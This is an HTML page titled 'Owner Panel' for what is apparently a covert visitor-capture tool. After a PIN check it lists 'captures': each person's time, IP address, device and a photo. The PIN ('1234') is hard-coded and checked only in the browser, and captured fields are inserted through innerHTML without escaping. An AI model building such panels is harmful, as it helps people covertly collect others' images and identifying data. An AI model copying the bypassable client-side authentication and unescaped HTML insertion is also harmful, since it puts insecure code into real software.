<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Owner Panel</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-900 text-white flex flex-col items-center justify-center min-h-screen">

  <!-- Navbar -->
  <nav class="w-full bg-gray-800 p-4 flex justify-between items-center">
    <h1 class="text-xl font-bold">🔑 Owner Panel</h1>
    <button onclick="toggleMenu()" class="text-2xl">☰</button>
    <div id="navLinks" class="hidden absolute top-14 right-4 bg-gray-700 rounded shadow-lg">
      <a href="index.html" class="block px-4 py-2 hover:bg-gray-600">Home</a>
      <a href="owner.html" class="block px-4 py-2 hover:bg-gray-600">Owner</a>
    </div>
  </nav>

  <!-- Owner PIN -->
  <div class="mt-10 text-center">
    <h2 class="text-2xl font-semibold mb-4">Enter Owner PIN</h2>
    <input id="ownerPin" type="password" placeholder="PIN" class="px-3 py-2 rounded text-black">
    <button onclick="checkOwner()" class="bg-green-500 px-4 py-2 ml-2 rounded hover:bg-green-600">Unlock</button>
  </div>

  <!-- Logs -->
  <div id="logs" class="hidden mt-10 w-3/4 max-w-lg">
    <h2 class="text-xl font-bold mb-4">📂 Capture History</h2>
    <div id="logContainer"></div>
  </div>

<script>
const OWNER_PIN = "1234";

function toggleMenu() {
  document.getElementById("navLinks").classList.toggle("hidden");
}

function checkOwner() {
  const pin = document.getElementById("ownerPin").value;
  if (pin === OWNER_PIN) {
    document.getElementById("logs").classList.remove("hidden");
    loadLogs();
  } else {
    alert("❌ Wrong Owner PIN!");
  }
}

function loadLogs() {
  fetch("/get-captures")
    .then(res => res.json())
    .then(logs => {
      const container = document.getElementById("logContainer");
      container.innerHTML = "";

      if (logs.length === 0) {
        container.innerHTML = "<p>No captures yet.</p>";
        return;
      }

      logs.forEach(log => {
        const div = document.createElement("div");
        div.className = "bg-gray-800 p-3 rounded mb-3 shadow";
        div.innerHTML = `
          🕒 ${log.time} <br>
          🌍 IP: ${log.ip} <br>
          📱 Device: ${log.device} <br>
          <img src="${log.img}" width="200" class="mt-2 rounded">
        `;
        container.appendChild(div);
      });
    });
}
</script>
</body>
</html>
